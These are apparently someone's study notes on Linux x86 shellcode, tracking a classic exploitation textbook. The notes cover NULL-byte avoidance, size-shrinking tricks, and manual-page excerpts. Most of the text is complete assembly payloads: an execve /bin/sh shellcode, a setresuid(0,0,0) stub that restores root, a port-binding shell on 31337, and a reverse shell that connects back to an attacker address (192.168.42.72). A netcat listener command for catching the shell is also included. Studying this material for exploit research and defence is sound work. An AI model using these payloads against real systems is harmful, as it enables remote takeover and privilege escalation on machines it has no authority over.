## x500
### Shellcode
#### Definitions/Concepts to know
- Shellcode isnt C, but the underlying assembly instructions used to create system calls via interrupts and such, in a C program you can trace a program's system calls via the ```strace``` command
  - Each linux system call should have a well documented ```man``` page
  - Each linux system call also has an unique number that assembly uses to reference it. These system calld will be executed using system interrupts via the ```int``` assembly instruction.
    - When int is called:
      - ```EAX``` is the system call to make
      - ```EBX, ECX, EDX``` hold the first second, and third arguments, these can be set with the ```mov``` instruction
- ```nasm``` is used to assemble assembly code, ```ndisasm``` does the opposite
  - with the ```-f elf``` flag it can create a standalone binary, although it will need to be linked with ```ld``` after
- Shellcode is injected into a running process much like a virus infecting a cell.
  - because of this, you cant declare memory as you would in a standalone executable. So shellcode must be able to execute regardless of current memory state, this is reffered to as position independent code.
- Stack based ecploits take advantage of the ```call``` instruction's control of execution flow via the return address.
  - If a function is called, your next instruction becomes the return address, if this is declaring your variable, this will be pushed to the stack in which it can be popped off and used without specifying an exact memory location.
- GDB Can be attached to coredumps, but if you want a sizeable one, make sure to use ```ulimit -c unlimited``` to move the restrictions on size after which you can simply use ```gdb -q -c ./core```

#### Fixing NULL bytes
On 32bit architecture, shell code that contains NULL bytes will be stripped, which can cause some issues with the shell code. There are a few techniques you can use to avoid this.
- For this section the following shellcode will be the example.
  ```
  BITS 32             ;  Tell nasm this is 32-bit code.

    call mark_below   ;  Call below the string to instructions
    db "Hello, world!",  0x0a, 0x0d  ; with newline and carriage return bytes.

  mark_below:
  ; ssize_t write(int fd,  const void *buf, size_t count);
    pop ecx           ; Pop  the return address (string ptr) into ecx.
    mov eax, 4        ; Write  syscall #.
    mov ebx, 1        ; STDOUT  file descriptor
    mov edx, 15       ; Length of the string
    int 0x80          ; Do syscall: write(1, string, 14)

  ; void _exit(int status);
    mov eax, 1        ; Exit syscall #
    mov ebx, 0        ; Status = 0
    int 0x80          ; Do syscall:  exit(0)
  ```
- **Function Calls** - Function calls are used to jump large stretches of memory, but in a smaller piece of self contained code, this will cause issues as it occupies only a small portion of memory, which will lead to these small jumps being padded with nulls.
  - To avoid this, we can use ```jmp``` instructions whhich can use shorts to jump to a location in memory, then we can use a call function to go to a previous section in memory which will result in the ```call``` function using a larger twos complement to represent a negative value. 
    - <details><summary>Example</summary>

        ```
        BITS 32             ;  Tell nasm this is 32-bit code.

        jmp short one       ;  Jump down to a call at the end.

        two:
        ; ssize_t write(int fd,  const void *buf, size_t count);
          pop ecx           ;  Pop the return address (string ptr) into ecx.
          mov eax, 4        ;  Write syscall #.
          mov ebx, 1        ;  STDOUT file descriptor
          mov edx, 15       ;  Length of the string
          int 0x80          ;  Do syscall: write(1, string, 14)

        ; void _exit(int status);
          mov eax, 1        ; Exit syscall #
          mov ebx, 0        ; Status = 0
          int 0x80          ; Do syscall: exit(0)

        one:
          call two   ; Call back upwards to avoid null bytes
          db "Hello, world!", 0x0a, 0x0d ; with newline and carriage return bytes.
        ```
      </details> 
- **```MOV``` instructions**
  - EAX, EBX, ECX, EDX, ESI, EDI, EBP, and ESP registers are 32 bits in width but they all have a 16 buit counterpart which simply removes the E (for extended). Within these 16 bit counterparts, the high 8 or the low 8 bits can be addresses individially int he case of ```AX``` using ```AH``` and ```AL``` respectively allowing for a n 8 bit instruction. 
    <details>
      <table>
      <thead>
        <tr>
          <th>Machine code</th>
          <th>Assembly</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>B8 04 00 00 00</td>
          <td>mov eax,0x4</td>
        </tr>
        <tr>
          <td>66 B8 04 00</td>
          <td>mov ax,0x4</td>
        </tr>
        <tr>
          <td>B0 04</td>
          <td>mov al,0x4</td>
        </tr>
      </tbody>
      </table>
    </details>

    - Using this method does have one big caveat. Since the upper 8 bits of the register can contain anything, it is best to zero out the register before using it. This is most easily done via executing an ```xor``` function on a register against itself resulting in all 0s. EX:   ```xor eax,eax```
      - <details><summary>Example</summary>

          ```
          BITS 32             ;  Tell nasm this is 32-bit code.

          jmp short one       ;  Jump down to a call at the end.

          two:
          ; ssize_t write(int fd,  const void *buf, size_t count);
            pop ecx           ; Pop  the return address (string ptr) into ecx.
            xor eax, eax      ; Zero  out full 32 bits of eax register.
            mov al, 4         ; Write  syscall #4 to the low byte of eax.
            xor ebx, ebx      ; Zero out ebx.
            inc ebx           ; Increment ebx to 1,  STDOUT file descriptor.
            xor edx, edx
            mov dl, 15        ; Length of the string
            int 0x80          ; Do syscall: write(1, string, 14)

          ; void _exit(int status);
            mov al, 1        ; Exit syscall #1, the top 3 bytes are still zeroed.
            dec ebx          ; Decrement ebx back down to 0 for status = 0.
            int 0x80         ; Do syscall: exit(0)

          one:
            call two   ; Call back upwards to avoid null bytes
            db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes.
          ```
          </details>

#### Spawning shells
As stated before, shell code's magic lies in the fact that everything your operating ystsem does is via collection of system calls, each of these system calls can be executed with some simple assembly, and one of the most pertinent for this topic is system call #11, ```execve()```
  - <details>

      ```

        EXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)

        NAME
              execve - execute program

        SYNOPSIS
              #include <unistd.h>

              int execve(const char *filename, char *const argv[],
                          char *const envp[]);

        DESCRIPTION
              execve() executes the program pointed to by filename. Filename must be
              either a binary executable, or a script starting with a line of  the
              form  "#! interpreter [arg]". In the latter case, the interpreter must
              be a valid pathname for an executable which is not itself a  script,
              which will be invoked as interpreter [arg] filename.

              argv is an array of argument strings passed to the new program. envp
              is an array of strings, conventionally of the form key=value, which are
              passed as environment to the new program. Both argv and envp must be
              terminated by a null pointer. The argument vector and environment can
              be accessed by the called program's main function, when it is defined
              as int main(int argc, char *argv[], char *envp[]).
      ```
    </details>
  - When called in our case the arguments will contain
    - **Filename** - A pointer to the string "/bin/sh"
    - **Args list** - empty (use a 32b null pointer)
    - **Env list** - empty (use a 32b null pointer)

The assembly looks a little like this:
```
BITS 32

  jmp short two     ; Jump down to the bottom for the call trick.
one:
; int execve(const char *filename, char *const argv [], char *const envp[])
  pop ebx           ; Ebx has the addr of the string.
  xor eax, eax      ; Put 0 into eax.
  mov [ebx+7], al   ; Null terminate the /bin/sh string.
  mov [ebx+8], ebx  ; Put addr from ebx where the AAAA is.
  mov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is.
  lea ecx, [ebx+8]  ; Load the address of [ebx+8] into ecx for argv ptr.
  lea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr.
  mov al, 11        ; Syscall #11
  int 0x80          ; Do it.

two:
  call one          ; Use a call to get string address.
  db '/bin/shXAAAABBBB'     ; The XAAAABBBB bytes aren't needed.
```
This results in the registers looking like:
  - EAX = 11
  - EBX = '\bin\sh'
  - ECX = 'AAAA' (in a real world case. this is a pointer to NULL)
  - EDX = 'BBBB' (in a real world case. this is a pointer to NULL) \
Or ```execvue('/bin/sh', [AAAA], [BBBB])```

*Note* Remove ```XAAAABBBB``` from the real shellcode

#### Privesc
Because some functions dont need to be run with root privileges, even in ```suid``` situations, sometimes programs drop privileges before executing potentially dangerous functions. In doing so , they use the ```seteuid()``` call, we are going to use the opposit call, ```setresuid()``` to uno reverse them. 
<details>
<summary>SETEGID MAN</summary>

  ```
  SETEGID(2)                 Linux Programmer's Manual                SETEGID(2)

  NAME
        seteuid, setegid - set effective user or group ID

  SYNOPSIS
        #include <sys/types.h>
        #include <unistd.h>

        int seteuid(uid_t euid);
        int setegid(gid_t egid);

  DESCRIPTION
        seteuid() sets the effective user ID of the current process.
        Unprivileged user processes may only set the effective user ID to
        ID to the real user ID, the effective user ID or the saved set-user-ID.
        Precisely the same holds for setegid() with "group" instead of "user".

  RETURN VALUE
        On success, zero is returned. On error, -1 is returned, and errno is
        set appropriately.
  ```
</details>
<details>
<summary>SETRESUID MAN</summary>

  ```
  SETRESUID(2)                                                                   Linux Programmer's Manual                                                                   SETRESUID(2)

  NAME
        setresuid, setresgid - set real, effective and saved user or group ID

  SYNOPSIS
        #define _GNU_SOURCE         /* See feature_test_macros(7) */
        #include <unistd.h>

        int setresuid(uid_t ruid, uid_t euid, uid_t suid);
        int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

  DESCRIPTION
        setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

        An unprivileged process may change its real UID, effective UID, and saved set-user-ID, each to one of: the current real UID, the current effective UID or the current saved set-
        user-ID.

        A privileged process (on Linux, one having the CAP_SETUID capability) may set its real UID, effective UID, and saved set-user-ID to arbitrary values.

        If one of the arguments equals -1, the corresponding value is not changed.

        Regardless of what changes are made to the real UID, effective UID, and saved set-user-ID, the filesystem UID is always set to the same value as the  (possibly  new)  effective
        UID.

        Completely  analogously,  setresgid()  sets the real GID, effective GID, and saved set-group-ID of the calling process (and always modifies the filesystem GID to be the same as
        the effective GID), with the same restrictions for unprivileged processes.

  RETURN VALUE
        On success, zero is returned.  On error, -1 is returned, and errno is set appropriately.

        Note: there are cases where setresuid() can fail even when the caller is UID 0; it is a grave security error to omit checking for a failure return from setresuid().

  ```
</details>

In doing so we must simply add a function that calls ```setresuid()``` with no arguments before calling our shell code, like this 
```
; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; Zero out eax.
  xor ebx, ebx      ; Zero out ebx.
  xor ecx, ecx      ; Zero out ecx.
  xor edx, edx      ; Zero out edx.
  mov al,  0xa4     ; 164 (0xa4) for syscall #164
  int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.

```


#### Shrinking Code
Because memory constraints are real we must do what we can to shrink our shell code (even though we just talked about adding padding to remove null bytes) to ensure our code can fit in these small windows that we want to execute them in. To do so, we're going to get rid of our functions and use the stack and our registers a bit more efficiently to save some bytes. 
```
BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; Zero out eax.
  push eax          ; Push some nulls for string termination.
  push 0x68732f2f   ; Push "//sh" to the stack.
  push 0x6e69622f   ; Push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx, via esp.
  push eax          ; Push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; Push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  mov al, 11        ; Syscall #11.
  int 0x80          ; Do it.
  ```
  This code ```push```es the bytes to the stack and ```mov```es them into the ```ebx``` register ```esp``` as its relative address for reference *Note: please pay attention to the endianess before pushing your strings to the stack as well as the stack's FILO nature*

  Another tip is to zero out ```ebx``` using **```cqd```**, qhich creates a quadword using the ```eax``` and ```edx``` registers, if ```eax``` is 0, it will flow into ```edx```. 

  Also when values are popped off the stack, they are sign extended to fill the whole register, in whis case you can add a number to the stack and pop it off into a register like ```eax``` when filling a syscall with a small number. This removes null bytes and saves space
  ```
  	6A 0B            push BYTE 11
	  58               pop eax
  ```
<details>
<summary>See these in action</summary>

  ```
  BITS 32

  ; setresuid(uid_t ruid, uid_t euid, uid_t suid);
    xor eax, eax      ; Zero out eax.
    xor ebx, ebx      ; Zero out ebx.
    xor ecx, ecx      ; Zero out ecx.
    cdq               ; Zero out edx using the sign bit from eax.
    mov BYTE al, 0xa4 ; syscall 164 (0xa4)
    int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.

  ; execve(const char *filename, char *const argv [], char *const envp[])
    push BYTE 11      ; push 11 to the stack.
    pop eax           ; pop the dword of 11 into eax.
    push ecx          ; push some nulls for string termination.
    push 0x68732f2f   ; push "//sh" to the stack.
    push 0x6e69622f   ; push "/bin" to the stack.
    mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
    push ecx          ; push 32-bit null terminator to stack.
    mov edx, esp      ; This is an empty array for envp.
    push ebx          ; push string addr to stack above null terminator.
    mov ecx, esp      ; This is the argv array with string ptr.
    int 0x80 
  ```
</details>

### Port Binding Shellcode
#### Opening a socket
When executing a remote process typical shellcode does you no good since it spawns the process on the remote host, to get around that, we're going to combine our knowledge of sockets with shellcode and enable remote C2
**Socketcall** - all linux socket functions are handled via the ```socketcall()``` system call with the appropriate arguments.
```
IPC(2)                     Linux Programmer's Manual                     IPC(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall() is a common kernel entry point for the socket system calls. call
       determines which socket function to invoke. args points to a block containing
       the actual arguments, which are passed through to the appropriate call.

       User programs should call  the  appropriate  functions  by  their  usual
       names.   Only  standard  library implementors and kernel hackers need to
       know about socketcall().
```
Socket calls are kind of weird in the fact that they are system calls themselves, but call their arguments like the governing systemcall. The syscall # for ```socketcall``` is #102, and its call #s are found in ```/usr/include/linux/net.h```, the last argument is the pointer for the arguments for the underlying socket call usually in an ```sock-addr``` struct.Your resulting shell-code will start with a socket declaration that will look something like this:
<details>

```
  BITS 32

  ; s = socket(2, 1, 0)
    push BYTE 0x66    ; socketcall is syscall #102 (0x66).
    pop eax
    cdq               ; Zero out edx for use as a null DWORD later.
    xor ebx, ebx      ; ebx is the type of socketcall.
    inc ebx           ; 1 = SYS_SOCKET = socket()
    push edx          ; Build arg array: { protocol = 0,
    push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
    push BYTE 0x2     ;                    AF_INET = 2 }
    mov ecx, esp      ; ecx = ptr to argument array
    int 0x80          ; After syscall, eax has socket file descriptor.

    mov esi, eax      ; save socket FD in esi for later

  ; bind(s, [2, 31337, 0], 16)
    push BYTE 0x66    ; socketcall (syscall #102)
    pop eax
    inc ebx           ; ebx = 2 = SYS_BIND = bind()
    push edx          ; Build sockaddr struct:  INADDR_ANY = 0
    push WORD 0x697a  ;   (in reverse order)    PORT = 31337
    push WORD bx      ;                         AF_INET = 2
    mov ecx, esp      ; ecx = server struct pointer
    push BYTE 16      ; argv: { sizeof(server struct) = 16,
    push ecx          ;         server struct pointer,
    push esi          ;         socket file descriptor }
    mov ecx, esp      ; ecx = argument array
    int 0x80          ; eax = 0 on success

  ; listen(s, 0)
    mov BYTE al, 0x66 ; socketcall (syscall #102)
    inc ebx
    inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
    push ebx          ; argv: { backlog = 4,
    push esi          ;         socket fd }
    mov ecx, esp      ; ecx = argument array
    int 0x80

  ; c = accept(s, 0, 0)
    mov BYTE al, 0x66 ; socketcall (syscall #102)
    inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
    push edx          ; argv: { socklen = 0,
    push edx          ;         sockaddr ptr = NULL,
    push esi          ;         socket fd }
    mov ecx, esp      ; ecx = argument array
    int 0x80          ; eax = connected socket FD
  ``` 
</details>

<details>

<summary>C code for reference</summary>

  ```c
  #include <unistd.h>
  #include <string.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>

  int main(void) {
    int sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd
    struct sockaddr_in host_addr, client_addr;   // My address information
    socklen_t sin_size;
    int yes=1;

    sockfd = socket(PF_INET, SOCK_STREAM, 0);

    host_addr.sin_family = AF_INET;         // Host byte order
    host_addr.sin_port = htons(31337);      // Short, network byte order
    host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.
    memset(&(host_addr.sin_zero), '\0', 8); // Zero the rest of the struct.

    bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));

    listen(sockfd, 4);
    sin_size = sizeof(struct sockaddr_in);
    new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
  }
  ```
</details>

Since all the needed calls to bind a port (```socket```, ```bind```. ```listen```, and ```accept```) are all sequential, you can save some bytes by ```inc```remening ```ebx``` and reusing data held in registers like ```edx``` and ```esi``` to make your code a bit more compact and efficient 

#### Std I/O
Standard input outout and error are all file descritors your computer uses to send and recieve data from a user, since we are going to need to capture and send data to a user we have to duplicate these file descriptors and use them to send/recieve data though our socket. We will use the ```dup2``` as it it capable of duplicating out socket (```c```) into what will be known to the program as stdin, stdout, and stderr.
```
DUP(2)                     Linux Programmer's Manual                     DUP(2)

NAME
       dup, dup2 - duplicate a file descriptor

SYNOPSIS
       #include <unistd.h>
       int dup(int oldfd);
       int dup2(int oldfd, int newfd);

DESCRIPTION
       dup() and dup2() create a copy of the file descriptor oldfd.

       dup2() makes newfd be the copy of oldfd, closing newfd first if necessary.
```
Calling dup2 is pretty simple as the only arguments that are require dis its syscall #63, the old fd and the new fd. The additions to the shellcode above will look like this. 
<details>

  ```
  ; dup2(connected socket, {all three standard I/O file descriptors})
    mov ebx, eax      ; Move socket FD in ebx.
    push BYTE 0x3F    ; dup2  syscall #63
    pop eax
    xor ecx, ecx      ; ecx = 0 = standard input
    int 0x80          ; dup(c, 0)
    mov BYTE al, 0x3F ; dup2  syscall #63
    inc ecx           ; ecx = 1 = standard output
    int 0x80          ; dup(c, 1)
    mov BYTE al, 0x3F ; dup2  syscall #63
    inc ecx           ; ecx = 2 = standard error
    int 0x80          ; dup(c, 2)

  ; execve(const char *filename, char *const argv [], char *const envp[])
    mov BYTE al, 11   ; execve  syscall #11
    push edx          ; push some nulls for string termination.
    push 0x68732f2f   ; push "//sh" to the stack.
    push 0x6e69622f   ; push "/bin" to the stack.
    mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
    push ecx          ; push 32-bit null terminator to stack.
    mov edx, esp      ; This is an empty array for envp.
    push ebx          ; push string addr to stack above null terminator.
    mov ecx, esp      ; This is the argv array with string ptr.
    int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
  ```
</details>

Since these pieces of shell code are becoming quite large we employ even more of the tricks in our bad to shorten some instructions. 
- Firstoff, we're goinf to shorten the dup instruction by creating a for loop that will execute three times with the value of STD incrementing between 0, 1,and 2. TO save even more, we cheat in the loop a bit and avoid using the ```cmp``` operator by simmply telling the program to loop again unless you encounter a signed value ```jns``` in our case, we'll only encounter that if our incrementer drops below 0. 
- After that in our code we take advantage of the ```xchg``` instruction that can exchange the value of two registers, which comes in handy for sitations in which we need to move a value into ```ebx``` while clearing out ```eax``` after these changes, our final binding shellcode will look like this: 

```
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66).
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; Ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.

  xchg esi, eax     ; Save socket FD in esi for later.

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000005 in eax.
  push BYTE 0x2     ; ecx starts at 2.
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```
### Reverse Shells
Since firewall policy can prevent a lot of por binding exokiuts from working, you can have a machine call back to your attackling host with a shell binded to a connection. To do so you simply have to use the code from above but instead use a ```connect()``` socket call. Since this problem did not exist with the port binding, because we listened on all IPs, it is important to note that your IP address must be stores in little endian notation. 
```
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66).
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.

  xchg esi, eax     ; Save socket FD in esi for later.

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  push DWORD 0x482aa8c0 ; Build sockaddr struct: IP address = 192.168.42.72
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000003 in eax.
  push BYTE 0x2     ; ecx starts at 2.
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; Count down to 0.
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11.
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```

to catch the resulting callback you can use a program like netcat to set up a tcp listener with the following syntax

```
nc -v -l -p 31337
```
